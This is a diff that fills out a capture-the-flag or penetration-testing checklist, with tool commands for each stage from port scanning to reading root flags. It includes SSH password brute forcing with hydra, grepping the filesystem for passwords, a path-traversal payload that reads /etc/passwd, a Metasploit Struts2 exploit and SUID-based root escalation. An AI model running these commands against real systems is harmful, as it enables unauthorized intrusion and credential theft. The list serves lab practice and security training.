@@ -1,26 +1,77 @@
-IP
+**IP: **
+ping <target_ip>
 
-OS
+**OS**
+nmap -O <target_ip>   # OS detection
+nmap -A <target_ip>    # Aggressive scan with OS detection and services
+nc -nv <target_ip> <port> # Banner grabbing to infer OS from service banner
 
-open port
+**open port**
+nmap -sV -sC <target_ip>           # Scan for open ports and services
+nmap -p- <target_ip>               # Scan all ports (1-65535)
+rustscan -a <target_ip> -- -sC -sV
 
-web tech
+**web tech**
+whatweb <target_ip>:<port>   # Identify web technologies
+nikto -h <target_ip>   # Look for web technologies and vulnerabilities
+wappalyzer
 
-users
+**users**
+enum4linux -a <target_ip>   # List SMB users, groups, and shares
+cat /etc/passwd             # List users on Linux
+msf:
+use auxiliary/scanner/smb/smb_enumusers
+set RHOSTS <target_ip>
+run
 
-creds
+**creds**
+hydra -l <username> -P <password_list> ssh://<target_ip>
+John the Ripper or Hashcat [crack any hash you discover during enumeration]
 
-files/dir
+find / -name "*.conf" -type f 2>/dev/null   # Look for config files that might have creds
+grep -ri "password" /                      # Search for passwords in files
 
-web root
+**files/dir**
+gobuster dir -u http://<target_ip> -w /path/to/wordlist.txt
+wfuzz -c -z file,/path/to/wordlist.txt --hc 404 http://<target_ip>/FUZZ
 
-privesc
 
-initial foothold access
+**web root**
+http://<target_ip>/vulnerable_page.php?file=../../../../etc/passwd
+/var/www/html/   # Common web root for Linux servers
 
-root level access
+**privesc**
+./linpeas.sh           # Script to enumerate privesc vectors on Linux
+./LinEnum.sh           # Another script for local enumeration
 
-flag
+sudo -l   # Check if the current user has sudo privileges [Misconfigured Sudo Permissions check]
+find / -perm -u=s -type f 2>/dev/null   # Search for SUID binaries
+
+**initial foothold access**
+searchsploit <service or software>   # Find exploits for the services running --
+MSF:
+use exploit/multi/http/struts2_content_type_ognl   # Example exploit
+set RHOST <target_ip>
+run --
+ssh <username>@<target_ip>
+
+**root level access**
+id
+whoami
+windows winpeas.exe   # Enumerate potential privilege escalation vectors
+
+linux SUID: 
+find / -perm -u=s -type f 2>/dev/null
+/bin/bash -p
+https://gtfobins.github.io/
+
+**flag**
+cat /root/root.txt
+cat /home/<user>/user.txt
+
+type C:\Users\Administrator\Desktop\root.txt
+type C:\Users\<user>\Desktop\user.txt
+
 
 upload flags 
 --
